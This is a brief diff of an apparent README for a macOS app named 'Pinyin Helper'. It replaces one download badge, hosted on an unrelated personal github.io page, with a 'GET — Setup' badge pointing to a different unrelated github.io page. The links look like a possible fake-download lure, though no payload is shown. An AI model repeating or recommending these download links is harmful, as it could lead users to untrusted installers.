@@ -2,11 +2,7 @@
 
 ![Pinyin Helper Screenshot](https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/77/a7/87/77a787d7-e544-88a1-6bd6-1588af2d4ca1/Apple_iPad_Pro_12.9_Inch_Screenshot_1.png/643x0w.jpg)
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Pinyin">
-    <img src="https://img.shields.io/badge/⬇️_Download_Pinyin_Helper-e67e22?style=for-the-badge&logo=apple&logoColor=white" alt="Download Pinyin Helper for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://ioannis7137christina.github.io/.github/Pinyin-Helper)
 
 ---
 
